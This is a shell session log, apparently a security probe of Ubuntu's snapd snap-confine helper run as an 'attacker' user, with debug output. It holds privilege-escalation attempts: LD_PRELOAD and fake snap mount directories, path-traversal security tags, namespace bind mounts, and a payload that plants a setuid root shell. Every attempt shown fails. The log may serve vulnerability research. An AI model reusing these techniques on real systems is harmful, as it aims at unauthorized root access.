$ runuser -u attacker -- bash -lc timeout\ -k\ 1s\ 8s\ env\ -i\ PATH=/tmp/scd-fakebin:/usr/bin:/bin\ SNAPD_DEBUG=1\ SNAP_CONFINE_MAX_PROFILE_WAIT=1\ LD_PRELOAD=/tmp/scd-preload.so\ LD_LIBRARY_PATH=/tmp\ SNAP_MOUNT_DIR=/tmp/scd-fake-snap\ SNAP_NAME=scd\ SNAP_INSTANCE_NAME=scd\ SNAP_REVISION=1\ SNAP_COOKIE=scd-cookie\ SNAP_CONTEXT=scd-context\ SNAP_DATA=/tmp/scd-data\ SNAP_COMMON=/tmp/scd-common\ SNAP_USER_DATA=/tmp/scd-user-data\ SNAP_USER_COMMON=/tmp/scd-user-common\ /usr/lib/snapd/snap-confine\ snap.scd.app\ /bin/id\ 2\>\&1\ \|\ sed\ -n\ \'1\,160p\'\;\ printf\ \'direct_rc=%s\\n\'\ \"\$\{PIPESTATUS\[0\]\}\"
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047709.177958"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
DEBUG: security tag: snap.scd.app
DEBUG: executable:   /bin/id
DEBUG: confinement:  non-classic
DEBUG: base snap:    core
DEBUG: umask reset, old umask was  022
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1779047709.178543"}
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope (global), uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: ensuring that snap mount directory is shared
DEBUG: unsharing snap namespace directory
DEBUG: releasing lock 5
DEBUG: opened snap-update-ns executable as file descriptor 5
DEBUG: opened snap-discard-ns executable as file descriptor 6
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/scd.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope scd, uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: initializing mount namespace: scd
cannot locate base snap core: No such file or directory
direct_rc=1
rc=0

## direct snap-confine --base core24 still requires default root-owned /snap base
$ runuser -u attacker -- bash -lc timeout\ -k\ 1s\ 8s\ env\ -i\ PATH=/tmp/scd-fakebin:/usr/bin:/bin\ SNAPD_DEBUG=1\ SNAP_CONFINE_MAX_PROFILE_WAIT=1\ LD_PRELOAD=/tmp/scd-preload.so\ LD_LIBRARY_PATH=/tmp\ SNAP_MOUNT_DIR=/tmp/scd-fake-snap\ SNAP_NAME=scd\ SNAP_INSTANCE_NAME=scd\ SNAP_REVISION=1\ SNAP_COOKIE=scd-cookie\ SNAP_CONTEXT=scd-context\ SNAP_DATA=/tmp/scd-data\ SNAP_COMMON=/tmp/scd-common\ SNAP_USER_DATA=/tmp/scd-user-data\ SNAP_USER_COMMON=/tmp/scd-user-common\ /usr/lib/snapd/snap-confine\ --base\ core24\ snap.scd.app\ /bin/id\ 2\>\&1\ \|\ sed\ -n\ \'1\,160p\'\;\ printf\ \'base_rc=%s\\n\'\ \"\$\{PIPESTATUS\[0\]\}\"
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047709.207024"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
DEBUG: security tag: snap.scd.app
DEBUG: executable:   /bin/id
DEBUG: confinement:  non-classic
DEBUG: base snap:    core24
DEBUG: umask reset, old umask was  022
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1779047709.207279"}
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope (global), uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: ensuring that snap mount directory is shared
DEBUG: unsharing snap namespace directory
DEBUG: releasing lock 5
DEBUG: opened snap-update-ns executable as file descriptor 5
DEBUG: opened snap-discard-ns executable as file descriptor 6
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/scd.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope scd, uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: initializing mount namespace: scd
cannot locate base snap core24: No such file or directory
base_rc=1
rc=0

## direct snap-confine --classic waits for missing root-owned seccomp profile, no exec
$ runuser -u attacker -- bash -lc timeout\ -k\ 1s\ 8s\ env\ -i\ PATH=/tmp/scd-fakebin:/usr/bin:/bin\ SNAPD_DEBUG=1\ SNAP_CONFINE_MAX_PROFILE_WAIT=1\ LD_PRELOAD=/tmp/scd-preload.so\ LD_LIBRARY_PATH=/tmp\ SNAP_MOUNT_DIR=/tmp/scd-fake-snap\ SNAP_NAME=scd\ SNAP_INSTANCE_NAME=scd\ SNAP_REVISION=1\ SNAP_COOKIE=scd-cookie\ SNAP_CONTEXT=scd-context\ SNAP_DATA=/tmp/scd-data\ SNAP_COMMON=/tmp/scd-common\ SNAP_USER_DATA=/tmp/scd-user-data\ SNAP_USER_COMMON=/tmp/scd-user-common\ /usr/lib/snapd/snap-confine\ --classic\ snap.scd.app\ /bin/sh\ -p\ -c\ \'id\;\ touch\ /root/snapd_current_default_deep_root_marker\;\ cp\ /bin/sh\ /tmp/snapd_current_default_deep_suid_sh\ \&\&\ chmod\ 4755\ /tmp/snapd_current_default_deep_suid_sh\'\ 2\>\&1\ \|\ sed\ -n\ \'1\,180p\'\;\ printf\ \'classic_rc=%s\\n\'\ \"\$\{PIPESTATUS\[0\]\}\"
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047709.238207"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
DEBUG: security tag: snap.scd.app
DEBUG: executable:   /bin/sh
DEBUG: confinement:  classic
DEBUG: base snap:    core
DEBUG: umask reset, old umask was  022
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1779047709.238451"}
DEBUG: preparing classic execution environment
DEBUG: -- snap startup {"stage":"snap-confine mount namespace finish", "time":"1779047709.238466"}
DEBUG: dropping caps
DEBUG: before dropping effective caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: after dropping effective caps: cap_dac_override,cap_sys_admin=p
DEBUG: creating user data directory: /tmp/scd-user-data
DEBUG: setting capabilities bounding set
DEBUG: drop caps as non-root? yes
DEBUG: before seccomp: cap_sys_admin=ep cap_dac_override+p
DEBUG: loading bpf program for security tag snap.scd.app
DEBUG: timeout waiting for seccomp binary profile file at /var/lib/snapd/seccomp/bpf//snap.scd.app.bin2
cannot stat /var/lib/snapd/seccomp: No such file or directory
classic_rc=1
rc=0

## security tag validation rejects traversal/malformed names
$ runuser -u attacker -- bash -lc for\ tag\ in\ \'snap.scd/../../tmp.x\'\ \'snap..app\'\ \'snap.scd..app\'\ \'snap.scd_../../x.app\'\ \'snap.scd.hook.configure\'\;\ do\ echo\ ---\ \$tag\;\ timeout\ -k\ 1s\ 5s\ env\ -i\ PATH=/tmp/scd-fakebin:/usr/bin:/bin\ SNAPD_DEBUG=1\ SNAP_CONFINE_MAX_PROFILE_WAIT=1\ LD_PRELOAD=/tmp/scd-preload.so\ LD_LIBRARY_PATH=/tmp\ SNAP_MOUNT_DIR=/tmp/scd-fake-snap\ SNAP_NAME=scd\ SNAP_INSTANCE_NAME=scd\ SNAP_REVISION=1\ SNAP_COOKIE=scd-cookie\ SNAP_CONTEXT=scd-context\ SNAP_DATA=/tmp/scd-data\ SNAP_COMMON=/tmp/scd-common\ SNAP_USER_DATA=/tmp/scd-user-data\ SNAP_USER_COMMON=/tmp/scd-user-common\ /usr/lib/snapd/snap-confine\ \"\$tag\"\ /bin/id\ 2\>\&1\ \|\ sed\ -n\ \'1\,40p\'\;\ echo\ tag_rc=\$\{PIPESTATUS\[0\]\}\;\ done
--- snap.scd/../../tmp.x
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047710.288119"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
security tag snap.scd/../../tmp.x not allowed
tag_rc=1
--- snap..app
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047710.296378"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
security tag snap..app not allowed
tag_rc=1
--- snap.scd..app
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047710.303865"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
security tag snap.scd..app not allowed
tag_rc=1
--- snap.scd_../../x.app
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047710.310275"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
security tag snap.scd_../../x.app not allowed
tag_rc=1
--- snap.scd.hook.configure
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047710.316991"}
DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: ruid: 1001, euid: 1001, suid: 1001
DEBUG: rgid: 1001, egid: 1001, sgid: 1001
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
DEBUG: host snap-confine is owned by root
DEBUG: SNAP_MOUNT_DIR (probed): /snap
DEBUG: security tag: snap.scd.hook.configure
DEBUG: executable:   /bin/id
DEBUG: confinement:  non-classic
DEBUG: base snap:    core
DEBUG: umask reset, old umask was  022
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1779047710.317864"}
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope (global), uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: ensuring that snap mount directory is shared
DEBUG: unsharing snap namespace directory
DEBUG: releasing lock 5
DEBUG: opened snap-update-ns executable as file descriptor 5
DEBUG: opened snap-discard-ns executable as file descriptor 6
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/scd.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope scd, uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: initializing mount namespace: scd
cannot locate base snap core: No such file or directory
tag_rc=1
rc=0

## direct namespace helpers lack inherited privileged caps
$ runuser -u attacker -- bash -lc /usr/lib/snapd/snap-update-ns\ scd\ 2\>\&1\;\ printf\ \"update_ns_rc=%s\\n\"\ \"\$\?\"\;\ /usr/lib/snapd/snap-discard-ns\ scd\ 2\>\&1\;\ printf\ \"discard_ns_rc=%s\\n\"\ \"\$\?\"
cannot update snap namespace: CAP_SYS_ADMIN capability not in effective set: operation not permitted
update_ns_rc=1
missing capability cap_sys_admin
discard_ns_rc=1
rc=0

## after direct snap-confine probes
MISSING /root/snapd_current_default_deep_root_marker
MISSING /tmp/snapd_current_default_deep_tmp_marker
MISSING /tmp/snapd_current_default_deep_suid_sh
ROOT_PROOF_CANDIDATE=NO

## fake namespace/base attempts stay namespace-scoped

## prepare fake snap/base/state tree under attacker-owned /tmp
$ runuser -u attacker -- bash -lc $'\nset -e\nBASE=/tmp/snapd-current-default-deep/fake\nmkdir -p "$BASE"/{fake-snap/core/1/meta,fake-snap/snapd/1/meta,fake-snap/scd/1/meta,fake-snap/scd/1/bin,fake-var-lib-snapd/mount,fake-run-snapd/lock,fake-run-snapd/ns}\nln -sfn 1 "$BASE/fake-snap/core/current"\nln -sfn 1 "$BASE/fake-snap/snapd/current"\nln -sfn 1 "$BASE/fake-snap/scd/current"\ncat > "$BASE/fake-snap/core/1/meta/snap.yaml" <<EOF\nname: core\ntype: base\nversion: "16"\nEOF\ncat > "$BASE/fake-snap/snapd/1/meta/snap.yaml" <<EOF\nname: snapd\ntype: snapd\nversion: "2.74.1"\nEOF\ncat > "$BASE/fake-snap/scd/1/meta/snap.yaml" <<EOF\nname: scd\nbase: core\nversion: "1"\nconfinement: strict\napps:\n  app:\n    command: bin/payload.sh\nEOF\ncat > "$BASE/fake-snap/scd/1/bin/payload.sh" <<EOF\n#!/bin/sh\nid > /tmp/snapd_current_default_deep_tmp_marker\ntouch /root/snapd_current_default_deep_root_marker\ncp /bin/sh /tmp/snapd_current_default_deep_suid_sh && chmod 4755 /tmp/snapd_current_default_deep_suid_sh\nEOF\nchmod 755 "$BASE/fake-snap/scd/1/bin/payload.sh"\ncat > "$BASE/fake-var-lib-snapd/mount/snap.scd.fstab" <<EOF\n$BASE/fake-snap/scd/1 /snap/scd/1 none bind,ro 0 0\nEOF\nfind "$BASE" -maxdepth 5 -printf "%M %u:%g %p -> %l\\n" | sort | sed -n "1,160p"\n'
-rw-r--r-- attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/core/1/meta/snap.yaml -> 
-rw-r--r-- attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd/1/meta/snap.yaml -> 
-rw-r--r-- attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/snapd/1/meta/snap.yaml -> 
-rw-r--r-- attacker:attacker /tmp/snapd-current-default-deep/fake/fake-var-lib-snapd/mount/snap.scd.fstab -> 
-rwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd/1/bin/payload.sh -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-run-snapd -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-run-snapd/lock -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-run-snapd/ns -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/core -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/core/1 -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/core/1/meta -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd/1 -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd/1/bin -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd/1/meta -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/snapd -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/snapd/1 -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/snapd/1/meta -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-var-lib-snapd -> 
drwxr-xr-x attacker:attacker /tmp/snapd-current-default-deep/fake/fake-var-lib-snapd/mount -> 
lrwxrwxrwx attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/core/current -> 1
lrwxrwxrwx attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/scd/current -> 1
lrwxrwxrwx attacker:attacker /tmp/snapd-current-default-deep/fake/fake-snap/snapd/current -> 1
rc=0

## user namespace root ownership is uid1001 on host
$ runuser -u attacker -- bash -lc unshare\ -Ur\ sh\ -c\ \'id\;\ printf\ \"uid_map=\"\;\ tr\ \"\\n\"\ \"\;\"\ \</proc/self/uid_map\;\ echo\;\ echo\ ns-root\ \>\ /tmp/scd-userns-owner-proof\;\ ls\ -ln\ /tmp/scd-userns-owner-proof\'\ 2\>\&1\;\ echo\ outside\;\ ls\ -ln\ /tmp/scd-userns-owner-proof\ 2\>\&1\ \|\|\ true
uid=0(root) gid=0(root) groups=0(root)
uid_map=         0       1001          1;
-rw-r--r-- 1 0 0 8 May 17 19:55 /tmp/scd-userns-owner-proof
outside
-rw-r--r-- 1 1001 1001 8 May 17 19:55 /tmp/scd-userns-owner-proof
rc=0

## user+mount+pid namespace with fake /snap /var/lib/snapd /run/snapd
$ runuser -u attacker -- bash -lc $'\nBASE=/tmp/snapd-current-default-deep/fake\ntimeout -k 2s 10s env BASE="$BASE" unshare -Urmpf --mount-proc bash -lc \'\nset +e\nid\nprintf "uid_map="\ntr "\\n" ";" </proc/self/uid_map\necho\nmount --make-rprivate / 2>/dev/null || true\nmount --bind "$BASE/fake-snap" /snap; echo bind_snap_rc=$?\nmount --bind "$BASE/fake-var-lib-snapd" /var/lib/snapd; echo bind_varlib_rc=$?\nmount --bind "$BASE/fake-run-snapd" /run/snapd; echo bind_run_rc=$?\nfindmnt /snap /var/lib/snapd /run/snapd || true\nenv -i PATH=/usr/bin:/bin SNAPD_DEBUG=1 SNAP_CONFINE_MAX_PROFILE_WAIT=1 SNAP_NAME=scd SNAP_INSTANCE_NAME=scd SNAP_REVISION=1 SNAP_COOKIE=scd-cookie SNAP_DATA=/tmp/scd-data SNAP_COMMON=/tmp/scd-common SNAP_USER_DATA=/tmp/scd-user-data SNAP_USER_COMMON=/tmp/scd-user-common /usr/lib/snapd/snap-confine snap.scd.app /snap/scd/current/bin/payload.sh 2>&1\necho ns_snap_confine_rc=$?\n\' 2>&1 | sed -n "1,240p"\nprintf "outer_rc=%s\\n" "${PIPESTATUS[0]}"\n'
uid=0(root) gid=0(root) groups=0(root)
uid_map=         0       1001          1;
bind_snap_rc=0
bind_varlib_rc=0
bind_run_rc=0
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1779047710.524435"}
DEBUG: caps at startup: =ep
DEBUG: ruid: 0, euid: 0, suid: 0
DEBUG: rgid: 0, egid: 0, sgid: 0
DEBUG: apparmor extensions to the system are not available
DEBUG: initial caps: =ep
DEBUG: after setting privileged caps: =ep cap_chown,cap_dac_override,cap_sys_admin+i cap_setgid,cap_setuid-ep
DEBUG: the user is member of root group
DEBUG: SNAP_MOUNT_DIR (probed): /snap
DEBUG: security tag: snap.scd.app
DEBUG: executable:   /snap/scd/current/bin/payload.sh
DEBUG: confinement:  non-classic
DEBUG: base snap:    core
DEBUG: umask reset, old umask was  022
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1779047710.524681"}
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope (global), uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: ensuring that snap mount directory is shared
DEBUG: performing operation: (disabled) use debug build to see details
DEBUG: performing operation: (disabled) use debug build to see details
DEBUG: unsharing snap namespace directory
DEBUG: releasing lock 5
DEBUG: opened snap-update-ns executable as file descriptor 5
DEBUG: opened snap-discard-ns executable as file descriptor 6
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: opening lock file: /run/snapd/lock/scd.lock
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope scd, uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: initializing mount namespace: scd
Terminated
ns_snap_confine_rc=143
outer_rc=124
rc=0

## after namespace fake-base attempts
MISSING /root/snapd_current_default_deep_root_marker
MISSING /tmp/snapd_current_default_deep_tmp_marker
MISSING /tmp/snapd_current_default_deep_suid_sh
ROOT_PROOF_CANDIDATE=NO

## default snap hooks and helpers reachable by uid1001
-r--r--r-- root:root /snap/README -> 
drwxr-xr-x root:root /snap -> 
drwxr-xr-x root:root /var/lib/snapd/snaps -> 
drwxr-xr-x root:root /var/lib/snapd/snaps/partial -> 
drwxr-xr-x root:root /var/snap -> 
find: '/var/lib/snapd/seed': No such file or directory
-rwxr-xr-x root:root /usr/lib/snapd/snap-bootstrap
-rwxr-xr-x root:root /usr/lib/snapd/snap-confine
-rwxr-xr-x root:root /usr/lib/snapd/snap-device-helper
-rwxr-xr-x root:root /usr/lib/snapd/snap-discard-ns
-rwxr-xr-x root:root /usr/lib/snapd/snap-exec
-rwxr-xr-x root:root /usr/lib/snapd/snap-failure
-rwxr-xr-x root:root /usr/lib/snapd/snap-fde-keymgr
-rwxr-xr-x root:root /usr/lib/snapd/snap-gdbserver-shim
-rwxr-xr-x root:root /usr/lib/snapd/snap-gpio-helper
-rwxr-xr-x root:root /usr/lib/snapd/snap-mgmt
-rwxr-xr-x root:root /usr/lib/snapd/snap-preseed
-rwxr-xr-x root:root /usr/lib/snapd/snap-recovery-chooser
-rwxr-xr-x root:root /usr/lib/snapd/snap-repair
-rwxr-xr-x root:root /usr/lib/snapd/snap-seccomp
-rwxr-xr-x root:root /usr/lib/snapd/snap-strace-shim
-rwxr-xr-x root:root /usr/lib/snapd/snap-update-ns
-rwxr-xr-x root:root /usr/lib/snapd/snapctl
-rwxr-xr-x root:root /usr/lib/snapd/snapd
-rwxr-xr-x root:root /usr/lib/snapd/snapd-apparmor
-rwxr-xr-x root:root /usr/lib/snapd/snapd.core-fixup.sh
-rwxr-xr-x root:root /usr/lib/snapd/snapd.run-from-snap
-rwxr-xr-x root:root /usr/lib/snapd/system-shutdown

## user-invokable snap helpers without installed snaps
$ runuser -u attacker -- bash -lc snap\ version\ 2\>\&1\;\ snap\ debug\ sandbox-features\ 2\>\&1\ \|\ sed\ -n\ \"1\,80p\"\;\ snap\ run\ not-installed\ 2\>\&1\;\ snap\ auto-import\ 2\>\&1\;\ snap\ known\ account\ 2\>\&1\ \|\ sed\ -n\ \"1\,40p\"
snap          2.74.1+ubuntu24.04.4
snapd         2.74.1+ubuntu24.04.4
series        16
ubuntu        24.04
kernel        6.10.14-linuxkit
architecture  arm64
configfiles:          mediated-configfiles
confinement-options:  classic devmode
dbus:                 mediated-bus-access
kmod:                 mediated-modprobe
ldconfig:             mediated-ldconfig
mount:                layouts mount-namespace per-snap-persistency per-snap-profiles per-snap-updates per-snap-user-profiles stale-base-invalidation
seccomp:              bpf-actlog bpf-argument-filtering kernel:allow kernel:errno kernel:kill_process kernel:kill_thread kernel:log kernel:trace kernel:trap kernel:user_notif
symlinks:             mediated-symlinks
udev:                 device-cgroup-v2 device-filtering tagging
error: snap "not-installed" is not installed
auto-import is disabled on classic
type: account
authority-id: canonical
account-id: canonical
display-name: Canonical
timestamp: 2016-04-01T00:00:00.0Z
username: canonical
validation: certified
sign-key-sha3-384: -CvQKAwRQ5h3Ffn10FILJoEZUXOv6km9FwA80-Rcj-f-6jadQ89VRswHNiEB9Lxk

AcLDXAQAAQoABgUCV7UYzwAKCRDUpVvql9g3IK7uH/4udqNOurx5WYVknzXdwekp0ovHCQJ0iBPw
TSFxEVr9faZSzb7eqJ1WicHsShf97PYS3ClRYAiluFsjRA8Y03kkSVJHjC+sIwGFubsnkmgflt6D
WEmYIl0UBmeaEDS8uY4Xvp9NsLTzNEj2kvzy/52gKaTc1ZSl5RDL9ppMav+0V9iBYpiDPBWH2rJ+
aDSD8Rkyygm0UscfAKyDKH4lrvZ0WkYyi1YVNPrjQ/AtBySh6Q4iJ3LifzKa9woIyAuJET/4/FPY
